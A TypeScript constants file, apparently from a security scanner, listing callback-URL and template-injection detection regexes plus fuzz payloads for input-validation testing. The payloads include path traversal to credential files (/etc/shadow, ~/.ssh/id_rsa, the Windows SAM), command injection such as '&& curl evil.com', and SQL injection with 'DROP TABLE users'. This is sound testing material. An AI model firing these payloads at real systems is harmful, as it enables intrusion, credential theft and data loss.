// Regex patterns for callback/webhook URL parameter detection
export const CALLBACK_URL_PARAM_NAMES: RegExp[] = [
  /callback/i,
  /webhook/i,
  /redirect/i,
  /return.?url/i,
  /notify.?url/i,
  /hook.?url/i,
  /endpoint/i,
  /target.?url/i,
  /forward.?to/i,
  /post.?back/i,
  /ping.?url/i,
  /result.?url/i,
  /response.?url/i,
];

// URL acceptance description patterns
export const CALLBACK_DESC_PATTERNS: RegExp[] = [
  /(?:provide|specify|enter|set)\s+(?:a\s+)?(?:callback|webhook|notification)\s+(?:url|endpoint|address)/i,
  /(?:url|endpoint)\s+(?:to|where)\s+(?:send|post|deliver|forward|notify)/i,
  /(?:will|shall)\s+(?:be\s+)?(?:sent|posted|delivered|forwarded)\s+to/i,
];

// Template injection patterns in prompt/resource content
export const TEMPLATE_INJECTION_PATTERNS: { name: string; pattern: RegExp; description: string }[] = [
  { name: "Mustache/Handlebars", pattern: /\{\{.*?\}\}/, description: "{{expression}} template syntax" },
  { name: "ES Template Literal", pattern: /\$\{.*?\}/, description: "${expression} template syntax" },
  { name: "Jinja2/Twig", pattern: /\{%.*?%\}/, description: "{% block %} template syntax" },
  { name: "ERB/ASP", pattern: /<%.*?%>/, description: "<% code %> template syntax" },
  { name: "Rust/Elixir", pattern: /#\[.*?\]/, description: "#[attribute] macro syntax" },
  { name: "Python f-string", pattern: /f["'].*?\{.*?\}.*?["']/, description: "f-string interpolation" },
];

// Fuzz payloads for input validation testing
export const FUZZ_PAYLOADS: { category: string; payloads: string[] }[] = [
  {
    category: "empty",
    payloads: ["", " ", "\t", "\n"],
  },
  {
    category: "long_string",
    payloads: ["A".repeat(10_000), "B".repeat(100_000)],
  },
  {
    category: "path_traversal",
    payloads: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "/etc/shadow",
      "~/.ssh/id_rsa",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
  },
  {
    category: "command_injection",
    payloads: [
      "; cat /etc/passwd",
      "| ls -la",
      "$(whoami)",
      "`id`",
      "&& curl evil.com",
    ],
  },
  {
    category: "sql_injection",
    payloads: [
      "' OR 1=1 --",
      "1; DROP TABLE users;--",
      "' UNION SELECT * FROM information_schema.tables--",
    ],
  },
  {
    category: "special_chars",
    payloads: [
      "\0",
      "\x00",
      "\u0000",
      "\uFEFF",
      "\u200B\u200C\u200D",
      "\u{1D573}\u{1D586}\u{1D591}\u{1D591}\u{1D594}",
    ],
  },
  {
    category: "type_confusion",
    payloads: [
      "null",
      "undefined",
      "true",
      "false",
      "NaN",
      "Infinity",
      "-Infinity",
      "0",
      "-1",
      "9999999999999999999",
    ],
  },
];
